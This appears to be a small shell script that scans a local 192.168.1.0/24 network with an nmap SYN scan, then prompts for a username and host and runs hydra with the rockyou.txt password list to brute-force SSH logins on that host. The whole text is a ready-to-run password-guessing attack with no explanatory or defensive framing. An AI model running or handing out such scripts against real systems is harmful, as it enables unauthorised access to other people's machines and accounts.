clear
sudo nmap -sS 192.168.1.1/24 --open

read -p "input username: " user
read -p "input hostname: " host

hydra -l $user -P rockyou.txt -vV -t 64 -o output.txt -I ssh://$host
